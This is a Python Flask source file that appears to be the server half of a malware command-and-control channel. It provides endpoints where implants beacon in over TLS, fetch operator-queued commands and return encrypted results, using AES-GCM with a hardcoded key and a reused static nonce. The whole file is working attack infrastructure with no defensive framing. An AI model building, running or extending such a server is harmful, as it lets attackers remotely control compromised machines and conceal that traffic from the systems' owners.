from flask import Flask, request
from base64 import b64decode, b64encode
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import ssl
import traceback

app = Flask(__name__)
KEY = b'anexampleverysecurekey1234567890'  # 32 bytes
NONCE = b"123456789012";
current_cmd = ""

@app.route('/beacon', methods=['POST'])
def beacon():
    try:
        data = b64decode(request.data)
        aesgcm = AESGCM(KEY)
        output = aesgcm.decrypt(NONCE, data, None)
        print("[+] Beacon: ", output.decode())
        return '', 200
    except Exception as e:
        print("[-] Error in /beacon:")
        traceback.print_exc()  # <-- add this line
        return 'Error', 500

@app.route('/cmd', methods=['GET'])
def get_cmd():
    global current_cmd
    if current_cmd == "":
        return ""
    aesgcm = AESGCM(KEY)
    encrypted = aesgcm.encrypt(NONCE, current_cmd.encode(), None)
    return b64encode(encrypted)

@app.route('/result', methods=['POST'])
def result():
    data = b64decode(request.data)
    aesgcm = AESGCM(KEY)
    result = aesgcm.decrypt(NONCE, data, None)
    print("[+] Result: ", result.decode())
    return '', 200

@app.route('/send', methods=['POST'])
def send():
    global current_cmd
    current_cmd = request.data.decode()
    return 'OK'

if __name__ == '__main__':
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('cert.pem', 'key.pem')
    app.run(host='0.0.0.0', port=5000, ssl_context=context)
